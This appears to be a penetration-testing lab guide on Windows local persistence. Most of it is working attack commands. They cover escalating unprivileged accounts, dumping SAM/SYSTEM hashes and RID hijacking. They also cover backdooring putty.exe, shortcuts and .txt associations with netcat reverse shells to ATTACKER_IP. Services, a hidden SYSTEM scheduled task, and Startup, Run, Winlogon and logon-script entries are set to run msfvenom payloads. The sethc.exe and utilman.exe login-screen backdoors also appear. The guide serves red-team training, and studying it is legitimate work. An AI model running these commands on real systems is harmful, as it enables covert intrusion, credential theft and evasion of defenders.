# Windows Local Persistance

There are many reasons why you'd want to establish persistence as quick as possible, including:

* **Re-exploitation isn't always possible:** Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
* **Gaining a foothold is hard to reproduce:** For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
* **The blue team is after you:** Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!

---

## 1. Tampering With Unprivileged Accounts

If we have access on a system as a Administrator we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

### 1.1 Assign Group Memberships

Requirement:

* Access as Administrator.
* Passwords for the unprivileged accounts or reset them if possible.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators group**. We can easily achieve this with the following command:

```Command Prompt
net localgroup administrators user0 /add
```

This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

You can also use the Backup Operators group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

```Command Prompt
net localgroup "Backup Operators" user1 /add
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. We'll use **WinRM** for this example:

```Command Prompt
net localgroup "Remote Management Users" user1 /add
```

**Note:** Make sure the group is enabled.

You can enable the group by disabling LocalAccountTokenFilterPolicy of UAC :

```Command Prompt
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Now log back in

Extract SYSTEM and SAM file

```Command Prompt
reg save hklm\system system.bak
reg save hklm\sam sam.bak
```

### 1.2 Special Privileges and Security Descriptors

Backup Operators group have the following privileges assigned by default:

* **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
* **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:

```Command Prompt
secedit /export /cfg config.inf
```

```config.inf
[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 0
MaximumPasswordAge = 42
MinimumPasswordLength = 0
.
.
[Event Audit]
AuditSystemEvents = 0
.
.
[Registry Values]
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryConsole\SecurityLevel=4,0
.
.
[Privilege Rights]
SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,user2 <-------- added user2
.
.
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,user2 <------- added user2
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeManageVolumePrivilege = *S-1-5-32-544,*S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
[Version]
signature="$CHICAGO$"
Revision=1
```

We finally convert the `.inf` file into a `.sdb` file which is then used to load the configuration back into the system:

```Command Prompt
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow user2 to connect. Think of a security descriptor as an ACL but applied to other system facilities.

```Command Prompt
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add user2 and assign it full privileges to connect to WinRM

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user. (via evil-winrm's -H [hash])

Notice that for this user to work with the given privileges fully, you'd have to change the LocalAccountTokenFilterPolicy registry key.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!

### 1.3 RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.

To find the assigned RIDs for any user, you can use the following command:

```Command Prompt
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
user1               S-1-5-21-1966530601-3185510712-10604624-1008
user2               S-1-5-21-1966530601-3185510712-10604624-1009
user3               S-1-5-21-1966530601-3185510712-10604624-1010
```

Now we only have to assign the RID=500 to user3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec).

```Command Prompt
PsExec64.exe -i -s regedit
```

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify **user3**, we need to search for a key with its RID in hex (1010 = `0x3F2`). Under the corresponding key, there will be a value called **F**, which holds the user's effective RID at position `0x30`:

![image](/img/WindowsLocalPersistence/1.png)

**Notice the RID is stored using little-endian notation, so its bytes appear reversed.**

We will now replace those two bytes with the RID of Administrator in hex (500 = `0x01F4`), switching around the bytes (`F401`):

![image](/img/WindowsLocalPersistence/2.png)

The next time user3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

---

## 2. Backdooring Files

This phase consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.

### 2.1 Executable Files

If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file with `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

```Command Prompt
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.

### 2.2 Shortcut Files

If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to calc on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

![image](/img/WindowsLocalPersistence/3.png)

Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:

```backdoor.ps1
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:

```Command Prompt
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![image](/img/WindowsLocalPersistence/4.png)

Let's start an nc listener to receive our reverse shell on our attacker's machine:

```Bash
nc -lvnp 4445
```

If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully.

### 2.3 Hijacking File Associations

In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. Let's say we want to check which program is used to open .txt files; we can just go and check for the `.txt` subkey and find which Programmatic ID (ProgID) is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:

![image](/img/WindowsLocalPersistence/5.png)

We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile\`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under `shell\open\command` (`HKLM\Software\Classes\txtfile\shell\open\command`) where the default command to be run for files with that extension is specified:

![image](/img/WindowsLocalPersistence/6.png)

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```backdoor2.ps1
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`.

Now let's change the registry key to run our backdoor script in a hidden window:

![image](/img/WindowsLocalPersistence/7.png)

Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.

---

## 3. Abusing Services

There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

### 3.1 Creating backdoor services

We can create and start a service named "service1" using the following commands:

```Command Prompt
sc.exe create service01 binPath= "net user Administrator Passwd123" start= auto
sc.exe start service01
```

**Note: There must be a space after each equal sign for the command to work.**

The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

You can then copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it:

```Command Prompt
sc.exe create service02 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start service02
```

### 3.2 Modifying existing services

While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

You can get a list of available services using the following command:

```Command Prompt
C:\> sc.exe query state=all
SERVICE_NAME: Service1
DISPLAY_NAME: Service1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

You should be able to find a stopped service called Service3. To query the service's configuration, you can use the following command:

```Command Prompt
C:\> sc.exe qc service3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: service3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\Service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : service3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

There are three things we care about when using a service for persistence:

* The executable `BINARY_PATH_NAME` should point to our payload.
* The service `START_TYPE` should be automatic so that the payload runs without user interaction.
* The `SERVICE_START_NAME`, which is the account under which the service will run, should preferably be set to `LocalSystem` to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

To reconfigure "service3" parameters, we can use the following command:

```Command Prompt
sc.exe config service3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

You can then query the service's configuration again to check if all went as expected:

```Command Prompt
C:\> sc.exe qc service3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: service3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : service3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

---

## 4. Abusing Scheduled Tasks

There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:

### 4.1 Task Scheduler

```Command Prompt
schtasks /create /sc minute /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

The previous command will create a `TaskBackdoor` task and execute an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges

To check if our task was successfully created, we can use the following command:

```Command Prompt
C:\> schtasks /query /tn taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
taskbackdoor                             8/19/2025 12:00:00 PM  Ready
```

### 4.2 Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**. The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, let's delete the SD value for the "TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:

```Command Prompt
c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task as shown in an example:

![image](/img/WindowsLocalPersistence/8.png)

If we try to query our service again, the system will tell us there is no such task:

```Command Prompt
C:\Users\Administrator> schtasks /query /tn taskbackdoor
    ERROR: The system cannot find the file specified.
```

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:

```Bash
nc -lvnp 4449
```

---

## 5. Logon Triggered Persistence

Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.

### 5.1 Startup folder

Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

For this task, let's generate a reverse shell payload using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

We will then copy our payload into the victim machine.

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open)

And log back via RDP. You should receive a connection back to your attacker's machine in few seconds.

### 5.2 Run / RunOnce

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time.

For this task, let's create a new reverse shell with msfvenom:

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

After transferring it to the victim machine, let's move it to `C:\Windows\`:

Let's then create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.

![image](/img/WindowsLocalPersistence/9.png)
![image](/img/WindowsLocalPersistence/10.png)

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).

### 5.3 Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` that could be interesting to gain persistence:

* `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
* `shell` points to the system's shell, which is usually `explorer.exe`.

![image](/img/WindowsLocalPersistence/11.png)

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

Let's start by creating a shell:

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`.

We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`. In this case we will use `Userinit`, but the procedure with `shell` is the same.

![image](/img/WindowsLocalPersistence/12.png)

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

### 5.4 Logon scripts

One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. **The variable isn't set by default**, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`.

To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:

![image](/img/WindowsLocalPersistence/13.png)

Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

---

## 6. Backdooring the Login Screen / RDP

If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

We will look at two methods that rely on accessibility features to this end.

### 6.1 Sticky Keys

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

![image](/img/WindowsLocalPersistence/14.png)

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:

```Command Prompt
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

After doing so, lock your session from the start menu

You should now be able to press `SHIFT` five times to access a terminal with `SYSTEM` privileges directly from the login screen:

![image](/img/WindowsLocalPersistence/15.png)

### 6.2 Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![image](/img/WindowsLocalPersistence/16.png)

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with `SYSTEM` privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:

```Command Prompt
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

To trigger our terminal, we will lock our screen from the start button.

And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with `SYSTEM` privileges:

![image](/img/WindowsLocalPersistence/17.png)

---
---
